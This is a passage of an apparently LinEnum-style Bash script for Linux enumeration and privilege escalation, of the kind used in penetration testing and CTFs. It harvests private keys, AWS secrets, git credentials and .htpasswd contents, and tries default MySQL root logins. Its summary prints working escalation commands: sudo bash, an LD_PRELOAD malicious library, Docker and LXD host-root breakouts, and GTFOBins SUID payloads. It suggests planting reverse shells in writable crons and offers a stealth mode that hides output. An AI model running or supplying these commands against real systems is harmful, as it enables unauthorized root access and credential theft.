    print_if_exists "\e[00;31m[-] Network and IP info:\e[00m" "$nicinfo"
    
    # ARP
    local arpinfo
    arpinfo=$(arp -a 2>/dev/null)
    if [ -z "$arpinfo" ]; then
        arpinfo=$(ip n 2>/dev/null)
    fi
    print_if_exists "\e[00;31m[-] ARP history:\e[00m" "$arpinfo"
    
    exec_print "\e[00;31m[-] Nameserver(s):\e[00m" sh -c "grep 'nameserver' /etc/resolv.conf 2>/dev/null"
    
    # Default route
    local defroute
    defroute=$(route 2>/dev/null | grep default)
    if [ -z "$defroute" ]; then
        defroute=$(ip r 2>/dev/null | grep default)
    fi
    print_if_exists "\e[00;31m[-] Default route:\e[00m" "$defroute"
    
    # Listening ports - try netstat first, then ss
    local tcpservs
    tcpservs=$(netstat -ntpl 2>/dev/null)
    if [ -z "$tcpservs" ]; then
        tcpservs=$(ss -t -l -n 2>/dev/null)
    fi
    print_if_exists "\e[00;31m[-] Listening TCP:\e[00m" "$tcpservs"
    
    local udpservs
    udpservs=$(netstat -nupl 2>/dev/null)
    if [ -z "$udpservs" ]; then
        udpservs=$(ss -u -l -n 2>/dev/null)
    fi
    print_if_exists "\e[00;31m[-] Listening UDP:\e[00m" "$udpservs"
    
    pause
}

#=============================================================================
# SERVICES INFO
#=============================================================================
services_info() {
    echo -e "\e[00;33m### SERVICES ############################################\e[00m"
    
    exec_print "\e[00;31m[-] Running processes:\e[00m" ps aux
    
    # Process binary permissions - optimized to avoid duplicate entries
    echo -e "\e[00;31m[-] Process binaries and permissions:\e[00m"
    ps aux 2>/dev/null | awk '{print $11}' | sort -u | head -50 | while read -r bin; do
        ls -la "$bin" 2>/dev/null
    done | sort -u
    echo ""
    
    exec_print "\e[00;31m[-] /etc/init.d/ binary permissions:\e[00m" ls -la /etc/init.d
    
    # Init.d files not belonging to root (limited)
    local initdperms
    initdperms=$(safe_find /etc/init.d/ \! -uid 0 -type f -exec ls -la {} \;)
    print_if_exists "\e[00;31m[-] /etc/init.d/ files not belonging to root:\e[00m" "$initdperms"
    
    # Systemd files - limited depth to prevent massive output
    if [ "$thorough" = "1" ]; then
        echo -e "\e[00;31m[-] /lib/systemd/* config files (limited):\e[00m"
        ls -lh /lib/systemd/ 2>/dev/null | head -30
        echo ""
    fi
    
    pause
}

#=============================================================================
# SOFTWARE CONFIGS
#=============================================================================
software_configs() {
    echo -e "\e[00;33m### SOFTWARE ############################################\e[00m"
    
    exec_print "\e[00;31m[-] Sudo version:\e[00m" sh -c "sudo -V 2>/dev/null | grep 'Sudo version'"
    exec_print "\e[00;31m[-] MYSQL version:\e[00m" mysql --version
    exec_print "\e[00;31m[-] Postgres version:\e[00m" psql -V
    exec_print "\e[00;31m[-] Apache version:\e[00m" sh -c "apache2 -v 2>/dev/null || httpd -v 2>/dev/null"
    
    # MySQL default credentials check
    if mysqladmin -uroot -proot version >/dev/null 2>&1; then
        echo -e "\e[00;33m[+] MYSQL accessible with default root/root credentials!\e[00m"
        echo ""
    fi
    
    if mysqladmin -uroot version >/dev/null 2>&1; then
        echo -e "\e[00;33m[+] MYSQL accessible as root with no password!\e[00m"
        echo ""
    fi
    
    # htpasswd files (limited search)
    if [ "$thorough" = "1" ]; then
        echo -e "\e[00;31m[-] Searching for htpasswd files...\e[00m"
        safe_find / -maxdepth "$MAX_FIND_DEPTH" -name .htpasswd -type f 2>/dev/null | while read -r htfile; do
            echo "Found: $htfile"
            cat "$htfile" 2>/dev/null
        done
        echo ""
    fi
    
    pause
}

#=============================================================================
# INTERESTING FILES
#=============================================================================
interesting_files() {
    echo -e "\e[00;33m### INTERESTING FILES ###################################\e[00m"
    
    # Useful binaries
    echo -e "\e[00;31m[-] Useful file locations:\e[00m"
    for bin in nc netcat wget nmap gcc curl python python3 perl; do
        which "$bin" 2>/dev/null
    done
    echo ""
    
    # Sensitive files permissions
    echo -e "\e[00;31m[-] Sensitive file permissions:\e[00m"
    ls -la /etc/passwd /etc/group /etc/profile /etc/shadow /etc/master.passwd 2>/dev/null
    echo ""
    
    # SUID files - OPTIMIZED: use -maxdepth and limit results
    # Cache results to avoid duplication in privesc analysis
    echo -e "\e[00;31m[-] SUID files (limited to $MAX_FIND_RESULTS):\e[00m"
    local suid_output
    suid_output=$(safe_find / -maxdepth "$MAX_FIND_DEPTH" -perm -4000 -type f 2>/dev/null)
    
    # Store in cache
    while IFS= read -r suidfile; do
        [ -n "$suidfile" ] && CACHED_SUID_FILES+=("$suidfile")
        [ -n "$suidfile" ] && CACHED_SUID_BINARIES+=("$(basename "$suidfile")")
    done <<< "$suid_output"
    
    # Display with ls -la
    echo "$suid_output" | while read -r suidfile; do
        [ -n "$suidfile" ] && ls -la "$suidfile" 2>/dev/null
    done
    echo ""
    
    # Interesting SUID files
    echo -e "\e[00;31m[-] Checking for interesting SUID binaries...\e[00m"
    for suidfile in "${CACHED_SUID_FILES[@]}"; do
        if echo "$suidfile" | grep -qw "$binarylist"; then
            echo -e "\e[00;33m[+] Interesting SUID: $suidfile\e[00m"
        fi
    done
    echo ""
    
    # SGID files - limited
    echo -e "\e[00;31m[-] SGID files (limited):\e[00m"
    safe_find / -maxdepth "$MAX_FIND_DEPTH" -perm -2000 -type f -exec ls -la {} \; | head -50
    echo ""
    
    # Capabilities
    local cap_output
    cap_output=$(getcap -r / 2>/dev/null || /sbin/getcap -r / 2>/dev/null)
    print_if_exists "\e[00;31m[-] Files with POSIX capabilities:\e[00m" "$cap_output"
    # Cache for privesc analysis
    [ -n "$cap_output" ] && CACHED_CAPABILITIES="$cap_output"
    
    pause
    
    # Thorough-only checks with resource management
    if [ "$thorough" = "1" ]; then
        echo -e "\e[00;31m[-] Running thorough file checks (resource-managed)...\e[00m"
        
        # Private keys in /home only
        echo -e "\e[00;31m[-] Searching for private keys in /home...\e[00m"
        grep -rl "PRIVATE KEY-----" /home 2>/dev/null | head -20
        echo ""
        
        # AWS keys
        echo -e "\e[00;31m[-] Searching for AWS keys in /home...\e[00m"
        grep -rli "aws_secret_access_key" /home 2>/dev/null | head -20
        echo ""
        
        # Git credentials
        echo -e "\e[00;31m[-] Git credentials:\e[00m"
        safe_find /home -maxdepth 4 -name ".git-credentials" -type f
        echo ""
        
        # World-writable files - VERY limited
        echo -e "\e[00;31m[-] World-writable files (sample):\e[00m"
        safe_find / -maxdepth 4 ! -path "*/proc/*" ! -path "/sys/*" -perm -2 -type f 2>/dev/null | head -30 | while read -r wwfile; do
            ls -la "$wwfile" 2>/dev/null
        done
        echo ""
        
        pause
    fi
    
    # History files
    exec_print "\e[00;31m[-] Current user's history files:\e[00m" ls -la ~/.*_history
    
    if ls -la /root/.*_history >/dev/null 2>&1; then
        echo -e "\e[00;33m[+] Root's history files are accessible!\e[00m"
        ls -la /root/.*_history 2>/dev/null
        echo ""
    fi
    
    # Conf files in /etc (limited)
    exec_print "\e[00;31m[-] Config files in /etc:\e[00m" sh -c "find /etc/ -maxdepth 1 -name '*.conf' -type f -exec ls -la {} \; 2>/dev/null | head -30"
    
    # Keyword search - optimized
    if [ -n "$keyword" ]; then
        echo -e "\e[00;31m[-] Searching for keyword '$keyword' in config files...\e[00m"
        safe_find / -maxdepth 4 -name "*.conf" -type f -exec grep -l "$keyword" {} \; 2>/dev/null
        echo ""
        
        echo -e "\e[00;31m[-] Searching for keyword '$keyword' in log files...\e[00m"
        safe_find /var/log -maxdepth 3 -name "*.log" -type f -exec grep -l "$keyword" {} \; 2>/dev/null
        echo ""
    fi
    
    pause
}

#=============================================================================
# DOCKER CHECKS
#=============================================================================
docker_checks() {
    echo -e "\e[00;33m### DOCKER/CONTAINER CHECKS #############################\e[00m"
    
    # Are we in a Docker container?
    if grep -qi docker /proc/self/cgroup 2>/dev/null || [ -f /.dockerenv ]; then
        echo -e "\e[00;33m[+] Looks like we're in a Docker container\e[00m"
        echo ""
        IN_DOCKER_CONTAINER=1
    fi
    
    # Are we a Docker host?
    if command -v docker >/dev/null 2>&1; then
        echo -e "\e[00;31m[-] Docker version:\e[00m"
        docker --version 2>/dev/null
        echo -e "\e[00;31m[-] Docker containers:\e[00m"
        docker ps -a 2>/dev/null
        echo ""
    fi
    
    # Docker group membership
    if id 2>/dev/null | grep -qi docker; then
        echo -e "\e[00;33m[+] We're a member of the docker group!\e[00m"
        echo ""
        IN_DOCKER_GROUP=1
    fi
    
    # LXC/LXD checks
    if grep -qa container=lxc /proc/1/environ 2>/dev/null; then
        echo -e "\e[00;33m[+] Looks like we're in a LXC container\e[00m"
        echo ""
    fi
    
    if id 2>/dev/null | grep -qi lxd; then
        echo -e "\e[00;33m[+] We're a member of the lxd group!\e[00m"
        echo ""
        IN_LXD_GROUP=1
    fi
    
    pause
}

#=============================================================================
# PRIVILEGE ESCALATION ANALYSIS (aggregates cached findings)
#=============================================================================

# Analyze kernel for known vulnerabilities
analyze_kernel_vulns() {
    [ -z "$CACHED_KERNEL_VERSION" ] && return
    
    local kernel_base=$(echo "$CACHED_KERNEL_VERSION" | grep -oE '^[0-9]+\.[0-9]+')
    local found=0
    
    for kver in "${!KERNEL_EXPLOITS[@]}"; do
        if [[ "$kernel_base" == "$kver" ]]; then
            local exploit_info="${KERNEL_EXPLOITS[$kver]}"
            local exploit_name=$(echo "$exploit_info" | cut -d'|' -f1)
            local cve=$(echo "$exploit_info" | cut -d'|' -f2)
            echo -e "\e[00;31m[CRITICAL] Kernel Exploit: $exploit_name ($cve)\e[00m"
            echo -e "\e[00;90m           Kernel: $CACHED_KERNEL_VERSION\e[00m"
            echo -e "\e[00;33m           Exploit-DB: https://www.exploit-db.com/search?cve=$cve\e[00m"
            echo ""
            found=1
        fi
    done
    
    return $found
}

# Analyze sudo permissions for exploitable commands
analyze_sudo_exploits() {
    [ -z "$CACHED_SUDO_OUTPUT" ] && return 1
    
    local found=0
    
    # Check for NOPASSWD ALL
    if echo "$CACHED_SUDO_OUTPUT" | grep -q "NOPASSWD.*ALL"; then
        echo -e "\e[00;31m[CRITICAL] Sudo ALL commands without password\e[00m"
        echo -e "\e[00;32m           Command: sudo /bin/bash\e[00m"
        echo ""
        found=1
    fi
    
    # Check for specific exploitable binaries
    for binary in "${!GTFO_SUID_EXPLOITS[@]}"; do
        if echo "$CACHED_SUDO_OUTPUT" | grep -qE "NOPASSWD.*/$binary"; then
            echo -e "\e[00;31m[HIGH] Sudo $binary without password\e[00m"
            echo -e "\e[00;32m       Exploit:\e[00m"
            echo -e "\e[00;33m       sudo $binary\e[00m"
            echo -e "\e[00;90m       ${GTFO_SUID_EXPLOITS[$binary]}\e[00m" | sed 's/^/       /'
            echo ""
            found=1
        fi
    done
    
    # Check for LD_PRELOAD
    if echo "$CACHED_SUDO_OUTPUT" | grep -q "env_keep.*LD_PRELOAD\|env_keep.*LD_LIBRARY_PATH"; then
        echo -e "\e[00;31m[HIGH] LD_PRELOAD preserved in sudo environment\e[00m"
        echo -e "\e[00;32m       Create malicious .so: gcc -fPIC -shared -o /tmp/x.so x.c\e[00m"
        echo -e "\e[00;32m       Execute: sudo LD_PRELOAD=/tmp/x.so <any_sudo_command>\e[00m"
        echo ""
        found=1
    fi
    
    return $found
}

# Analyze SUID binaries for GTFOBins exploits
analyze_suid_exploits() {
    [ ${#CACHED_SUID_BINARIES[@]} -eq 0 ] && return 1
    
    local found=0
    
    for i in "${!CACHED_SUID_FILES[@]}"; do
        local suidfile="${CACHED_SUID_FILES[$i]}"
        local binary="${CACHED_SUID_BINARIES[$i]}"
        
        if [[ -n "${GTFO_SUID_EXPLOITS[$binary]}" ]]; then
            echo -e "\e[00;31m[HIGH] Exploitable SUID: $suidfile\e[00m"
            echo -e "\e[00;32m       Exploit:\e[00m"
            echo -e "\e[00;33m       ${GTFO_SUID_EXPLOITS[$binary]}\e[00m" | sed 's/^/       /'
            echo ""
            found=1
        fi
    done
    
    return $found
}

# Analyze PATH for hijacking opportunities
analyze_path_hijacking() {
    local found=0
    
    # Check for current directory in PATH
    if echo "$CACHED_PATH" | grep -qE '(^|:)\.($|:)|::'; then
        echo -e "\e[00;31m[HIGH] Current directory (.) in PATH\e[00m"
        echo -e "\e[00;32m       Create malicious binary in current directory\e[00m"
        echo ""
        found=1
    fi
    
    # Check for writable directories in PATH
    echo "$CACHED_PATH" | tr ':' '\n' | while read -r pathdir; do
        if [ -w "$pathdir" ] 2>/dev/null; then
            echo -e "\e[00;31m[MEDIUM] Writable PATH directory: $pathdir\e[00m"
            echo -e "\e[00;32m         Place malicious binary (e.g., 'ls') and wait for root execution\e[00m"
            echo ""
            found=1
        fi
    done
    
    return $found
}

# Analyze capabilities for privilege escalation
analyze_capabilities() {
    [ -z "$CACHED_CAPABILITIES" ] && return 1
    
    local found=0
    
    while IFS= read -r line; do
        local binary=$(echo "$line" | awk '{print $1}')
        
        if echo "$line" | grep -q "cap_setuid"; then
            echo -e "\e[00;31m[CRITICAL] CAP_SETUID: $binary\e[00m"
            echo -e "\e[00;32m           Can escalate to root UID\e[00m"
            echo ""
            found=1
        elif echo "$line" | grep -q "cap_dac_read_search"; then
            echo -e "\e[00;31m[HIGH] CAP_DAC_READ_SEARCH: $binary\e[00m"
            echo -e "\e[00;32m       Can read any file (e.g., /etc/shadow)\e[00m"
            echo ""
            found=1
        elif echo "$line" | grep -q "cap_sys_admin"; then
            echo -e "\e[00;31m[HIGH] CAP_SYS_ADMIN: $binary\e[00m"
            echo -e "\e[00;32m       Can mount filesystems / escape containers\e[00m"
            echo ""
            found=1
        elif echo "$line" | grep -q "cap_sys_ptrace"; then
            echo -e "\e[00;31m[MEDIUM] CAP_SYS_PTRACE: $binary\e[00m"
            echo -e "\e[00;32m         Can inject into processes\e[00m"
            echo ""
            found=1
        fi
    done <<< "$CACHED_CAPABILITIES"
    
    return $found
}

# Analyze cron jobs for writable scripts
analyze_cron_vectors() {
    local found=0
    
    # Check cached writable crons
    if [ -n "$CACHED_WRITABLE_CRONS" ]; then
        echo -e "\e[00;31m[HIGH] Writable cron files found\e[00m"
        echo "$CACHED_WRITABLE_CRONS" | head -5
        echo -e "\e[00;32m       Inject reverse shell for root execution\e[00m"
        echo ""
        found=1
    fi
    
    # Check for tar wildcard in cron (common CTF vector)
    if grep -r "tar.*\*" /etc/cron* 2>/dev/null | head -3 | grep -q .; then
        echo -e "\e[00;31m[MEDIUM] Tar wildcard injection in cron\e[00m"
        echo -e "\e[00;32m         Create checkpoint files in backup directory\e[00m"
        echo ""
        found=1
    fi
    
    return $found
}

# Analyze container escape vectors
analyze_container_breakouts() {
    local found=0
    
    if [ "$IN_DOCKER_GROUP" = "1" ]; then
        echo -e "\e[00;31m[CRITICAL] Docker group membership\e[00m"
        echo -e "\e[00;32m           docker run -v /:/mnt --rm -it alpine chroot /mnt sh\e[00m"
        echo ""
        found=1
    fi
    
    if [ "$IN_LXD_GROUP" = "1" ]; then
        echo -e "\e[00;31m[CRITICAL] LXD group membership\e[00m"
        echo -e "\e[00;32m           lxc init ubuntu:18.04 priv -c security.privileged=true\e[00m"
        echo -e "\e[00;32m           lxc config device add priv host-root disk source=/ path=/mnt/root\e[00m"
        echo -e "\e[00;32m           lxc start priv && lxc exec priv /bin/sh\e[00m"
        echo ""
        found=1
    fi
    
    return $found
}

# Analyze NFS exports for no_root_squash
analyze_nfs_exploits() {
    if ! can_read /etc/exports; then
        return 1
    fi
    
    if grep -v '^#' /etc/exports 2>/dev/null | grep -q "no_root_squash"; then
        echo -e "\e[00;31m[HIGH] NFS share with no_root_squash\e[00m"
        grep "no_root_squash" /etc/exports 2>/dev/null | head -3
        echo -e "\e[00;32m       Mount from attacker machine as root to create SUID binaries\e[00m"
        echo ""
        return 0
    fi
    
    return 1
}

# Master privilege escalation summary
privilege_escalation_summary() {
    echo ""
    if [ "$QUIET_MODE" = "1" ]; then
        echo "============================================================"
        echo "      PRIVILEGE ESCALATION ANALYSIS"
        echo "============================================================"
    else
        echo -e "\e[00;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
        echo -e "\e[00;35m         ⚠️  PRIVILEGE ESCALATION VECTORS\e[00m"
        echo -e "\e[00;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
    fi
    echo ""
    echo -e "\e[00;33mAggregating findings from enumeration phase...\e[00m"
    echo ""
    
    local vectors_found=0
    
    # Run all analysis functions
    analyze_kernel_vulns && ((vectors_found++))
    analyze_sudo_exploits && ((vectors_found++))
    analyze_suid_exploits && ((vectors_found++))
    analyze_container_breakouts && ((vectors_found++))
    analyze_capabilities && ((vectors_found++))
    analyze_path_hijacking && ((vectors_found++))
    analyze_cron_vectors && ((vectors_found++))
    analyze_nfs_exploits && ((vectors_found++))
    
    # Summary
    if [ "$vectors_found" -eq 0 ]; then
        echo -e "\e[00;32m[✓] No obvious privilege escalation vectors detected\e[00m"
        echo -e "\e[00;90m    This doesn't mean the system is secure - manual review recommended\e[00m"
    else
        echo -e "\e[00;31m[!] Found $vectors_found potential privilege escalation vector(s)\e[00m"
        echo -e "\e[00;33m    Review findings above and test exploits in controlled environment\e[00m"
    fi
    
    echo ""
    echo -e "\e[00;90mResources:\e[00m"
    echo -e "\e[00;90m  - GTFOBins: https://gtfobins.github.io/\e[00m"
    echo -e "\e[00;90m  - PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings\e[00m"
    echo -e "\e[00;90m  - Linux Privilege Escalation: https://github.com/rebootuser/LinEnum\e[00m"
    echo ""
    
    pause
}

#=============================================================================
# VERSION INVENTORY REPORT (shown with -i flag)
#=============================================================================
version_inventory_report() {
    if [ "$INSPECT_VERSIONS" != "1" ]; then
        return
    fi
    
    # Collect all versions first
    collect_all_versions
    
    echo ""
    if [ "$QUIET_MODE" = "1" ]; then
        echo "============================================================"
        echo "           VERSION INVENTORY REPORT"
        echo "============================================================"
    else
        echo -e "\e[00;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
        echo -e "\e[00;35m         📦 VERSION INVENTORY REPORT\e[00m"
        echo -e "\e[00;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
    fi
    echo ""
    echo "Collected at: $(date)"
    echo "Hostname: $(hostname)"
    echo ""
    
    if [ "$QUIET_MODE" = "1" ]; then
        echo "------------------------------------------------------------"
        printf "%-20s | %-15s | %s\n" "COMPONENT" "VERSION" "SOURCE"
        echo "------------------------------------------------------------"
    else
        echo -e "\e[00;90m------------------------------------------------------------\e[00m"
        printf "\e[00;33m%-20s\e[00m | \e[00;32m%-15s\e[00m | \e[00;90m%s\e[00m\n" "COMPONENT" "VERSION" "SOURCE"
        echo -e "\e[00;90m------------------------------------------------------------\e[00m"
    fi
    
    # Sort and display all collected versions
    for component in "${!VERSION_INVENTORY[@]}"; do
        local data="${VERSION_INVENTORY[$component]}"
        local ver=$(echo "$data" | cut -d'|' -f1)
        local src=$(echo "$data" | cut -d'|' -f2)
        
        if [ "$QUIET_MODE" = "1" ]; then
            printf "%-20s | %-15s | %s\n" "$component" "$ver" "$src"
        else
            printf "%-20s | \e[00;32m%-15s\e[00m | \e[00;90m%s\e[00m\n" "$component" "$ver" "$src"
        fi
    done | sort
    
    echo ""
    if [ "$QUIET_MODE" = "1" ]; then
        echo "------------------------------------------------------------"
        echo "Total components found: ${#VERSION_INVENTORY[@]}"
        echo "------------------------------------------------------------"
    else
        echo -e "\e[00;90m------------------------------------------------------------\e[00m"
        echo -e "\e[00;33mTotal components found:\e[00m ${#VERSION_INVENTORY[@]}"
        echo -e "\e[00;90m------------------------------------------------------------\e[00m"
    fi
    
    # Critical components warning
    echo ""
    if [ "$QUIET_MODE" = "1" ]; then
        echo "[!] REVIEW THESE VERSIONS AGAINST KNOWN CVEs:"
    else
        echo -e "\e[00;31m[!] REVIEW THESE VERSIONS AGAINST KNOWN CVEs:\e[00m"
    fi
    echo "    - NVD (NIST): https://nvd.nist.gov/vuln/search"
    echo "    - CVE Details: https://www.cvedetails.com"
    echo "    - Exploit-DB:  https://www.exploit-db.com"
    echo ""
    
    pause
}

#=============================================================================
# FOOTER
#=============================================================================
footer() {
    if [ "$QUIET_MODE" = "1" ]; then
        # Minimal footer for stealth mode (still goes to report)
        echo ""
        echo "=== SCAN COMPLETE ==="
        echo "Finished: $(date)"
        echo "Target: $(hostname)"
        return
    fi
    echo ""
    echo -e "\e[00;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
    echo ""
    echo -e "\e[00;32m  ✓ SCAN COMPLETE\e[00m"
    echo ""
    echo -e "\e[00;90m  Finished at: $(date)\e[00m"
    echo -e "\e[00;90m  $script_name v$version - Resource-optimized scan\e[00m"
    echo ""
    echo -e "\e[00;36m  Inspecting the Linux so you don't have to.\e[00m"
    echo ""
    echo -e "\e[00;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
    echo ""
}

#=============================================================================
# MAIN EXECUTION
#=============================================================================
call_each() {
    header
    debug_info
    system_info
    user_info
    environmental_info
    job_info
    networking_info
    services_info
    software_configs
    interesting_files
    docker_checks
    version_inventory_report  # Version inspection report (if -i enabled)
    privilege_escalation_summary  # Aggregated privesc analysis from cached findings
    footer
}

# Parse command line options
while getopts "k:r:e:stfqih" option; do
    case "${option}" in
        k) keyword=${OPTARG};;
        r) report=${OPTARG}"-$(date +"%d-%m-%y")";;
        e) export=${OPTARG};;
        s) sudopass=1;;
        t) thorough=1;;
        f) SECTION_DELAY=0; FIND_DELAY=0;;  # Fast mode
        q) QUIET_MODE=1; RANDOM_DELAY=1;;   # Quiet/Stealth mode
        i) INSPECT_VERSIONS=1;;             # Version inspection mode
        h) usage; exit 0;;
        *) usage; exit 1;;
    esac
done

# Quiet mode requires a report file
if [ "$QUIET_MODE" = "1" ] && [ -z "$report" ]; then
    echo "Error: Quiet mode (-q) requires a report file (-r)" >&2
    exit 1
fi

# Detect user privilege level
detect_privileges

# Set low priority for entire script if enabled
if [ "$LOW_PRIORITY" = "1" ]; then
    renice 19 $$ >/dev/null 2>&1
    ionice -c 3 -p $$ >/dev/null 2>&1
fi

# Ensure report file path is writable
if [ -n "$report" ]; then
    # If report path is absolute and not writable, try to use home directory
    report_dir=$(dirname "$report")
    if [ ! -w "$report_dir" ] 2>/dev/null; then
        echo -e "\e[00;33m[!] Warning: Cannot write to $report_dir, using $HOME instead\e[00m" >&2
        report="$HOME/$(basename "$report")"
    fi
fi

# Run the scan
if [ "$QUIET_MODE" = "1" ]; then
    # Stealth mode: no terminal output, write directly to file
    call_each > "$report" 2>/dev/null
elif [ -n "$report" ]; then
    call_each | tee -a "$report" 2>/dev/null
else
    call_each
fi

# End of script
